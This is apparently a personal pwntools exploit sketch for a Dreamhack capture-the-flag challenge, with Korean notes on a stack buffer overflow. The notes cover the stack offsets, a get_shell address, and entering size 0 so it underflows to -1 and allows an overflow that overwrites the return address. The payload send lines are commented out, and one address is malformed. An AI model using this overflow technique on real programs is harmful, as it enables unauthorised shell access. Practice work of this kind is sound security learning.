#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'
p = pwn.remote("host1.dreamhack.games", 20787)

size = 0
payload = "A"*300

#p.send(int(size))
#p.send(payload)
p.interactive()

"""
Size 저장 위치 : ebp-0x104 = 0xffffce94
Size에서 -1 이하 혹은 257 이상을 입력할 경우 Buffer Overflow 출력과 함께 프로그램 종료
Data 저장 위치 : ebp-0x100 = 0xffffce910104
입력받는 크기는 Size -1 만큼 입력받음

get_shell : 0x8048659

입력을 받을 때 size - 1 만큼 입력 받기 때문에 0을 입력할 경우 size의 크기를 -1로 입력시킬 수 있다.
그 다음 RET 주소를 get_shell 주소로 변조시켜주로겨 하였으나 테스트를 위해 A를 300개 입력하였는데 shell이 따졌다?..
"""
